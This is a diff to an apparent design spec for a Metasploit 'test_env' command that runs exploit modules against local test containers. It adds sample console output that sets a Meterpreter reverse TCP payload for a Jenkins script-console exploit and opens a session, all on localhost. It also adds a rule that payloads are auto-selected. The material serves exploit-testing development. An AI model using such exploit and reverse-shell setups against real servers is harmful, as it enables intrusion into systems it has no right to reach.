@@ -146,6 +146,9 @@ msf exploit(multi/http/jenkins_script_console) > test_env exec 1
 [*] Set RHOSTS 127.0.0.1
 [*] Set RPORT 49153
 [*] Set TARGETURI /script
+[*] Set PAYLOAD java/meterpreter/reverse_tcp
+[*] Set LHOST 127.0.0.1
+[*] Set LPORT 4444
 [*] Started reverse TCP handler on 127.0.0.1:4444
 [+] Session 1 opened (127.0.0.1:4444 -> 127.0.0.1:49153)
 ```
@@ -278,4 +281,5 @@ msf exploit(multi/http/jenkins_script_console) > test_env remove-all
 - Table output must use `Rex::Ui::Text::Table` for consistency with built-in commands like `sessions`, `jobs`
 - The `test_env` command must be available regardless of whether a database is connected (Phase 1 is in-memory only)
 - Container labels must be applied on every `run` so that orphaned containers can be identified even if the registry is lost
+- `test_env build` must detect if the active module requires a payload. If so, it auto-selects a compatible default payload and sets `LHOST` to `127.0.0.1` with an available `LPORT`. These values are stored in the registry alongside the environment metadata. `test_env exec` then applies the complete stored datastore (including payload options) before running the exploit.
 - The `VulnerableEnvironment` key is the canonical metadata key. No abbreviated form (`VulnEnv`) is accepted.
